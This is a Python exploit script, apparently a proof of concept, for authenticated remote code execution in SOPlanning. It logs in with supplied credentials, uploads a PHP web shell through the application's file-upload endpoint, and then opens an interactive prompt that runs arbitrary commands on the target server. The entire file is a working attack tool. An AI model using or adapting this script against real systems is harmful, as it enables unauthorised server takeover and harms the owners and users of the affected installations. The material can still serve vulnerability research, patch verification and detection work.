import argparse
import requests
import random
import string
import urllib.parse


def command_shell(exploit_url):
    """
    Provides an interactive shell to send commands to the uploaded web shell.
    """
    print("[+] Entering interactive shell. Type 'exit' to quit.")
    while True:
        commands = input("soplanning:~$ ")
        if commands.strip().lower() == 'exit':
            print("[+] Exiting shell.")
            break
        
        encoded_command = urllib.parse.quote_plus(commands)
        try:
            response = requests.get(f"{exploit_url}?cmd={encoded_command}")
            if response.status_code == 200:
                print(response.text)
            else:
                print(f"[-] Error: Received HTTP {response.status_code}")
        except Exception as e:
            print(f"[-] Error: {e}")


def exploit(username, password, url):
    """
    Executes the exploit by authenticating, uploading a malicious PHP file, and providing access to the web shell.
    """
    try:
        # Login to the application
        login_url = f"{url}/process/login.php"
        login_data = {"login": username, "password": password}
        print("[+] Logging in...")
        response = requests.post(login_url, data=login_data, allow_redirects=False)

        if response.status_code != 200 or not response.cookies:
            print("[-] Login failed. Check credentials.")
            return

        cookies = response.cookies
        print("[+] Login successful. Cookies obtained.")

        # Prepare web shell upload
        upload_url = f"{url}/process/upload.php"
        link_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        php_filename = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=3))}.php"
        
        multipart_form_data = {
            "linkid": link_id,
            "periodeid": 0,
            "fichiers": php_filename,
            "type": "upload"
        }

        web_shell = "<?php system($_GET['cmd']); ?>"
        files = {
            'fichier-0': (php_filename, web_shell, 'application/x-php')
        }

        print("[+] Uploading web shell...")
        upload_response = requests.post(upload_url, cookies=cookies, files=files, data=multipart_form_data)

        if upload_response.status_code == 200 and "File" in upload_response.text:
            print(f"[+] Web shell uploaded successfully: {upload_response.text}")
            exploit_url = f"{url}/upload/files/{link_id}/{php_filename}"
            print(f"[+] Access the web shell at: {exploit_url}?cmd=<command>")

            if input("[?] Do you want an interactive shell? (yes/no) ").strip().lower() == 'yes':
                command_shell(exploit_url)
        else:
            print("[-] Failed to upload web shell. Check the target and try again.")
    except Exception as e:
        print(f"[-] Error: {e}")


def main():
    """
    Main function to parse arguments and initiate the exploit.
    """
    parser = argparse.ArgumentParser(
        description="SOPlanning RCE Exploit",
        usage="python3 soplanning_rce_exploit.py -t http://example.com -u admin -p admin"
    )

    parser.add_argument("-t", "--target", type=str, required=True, help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-u", "--username", type=str, required=True, help="Username for authentication")
    parser.add_argument("-p", "--password", type=str, required=True, help="Password for authentication")

    args = parser.parse_args()

    print("[+] Starting SOPlanning RCE exploit...")
    exploit(args.username, args.password, args.target)


if __name__ == "__main__":
    main()
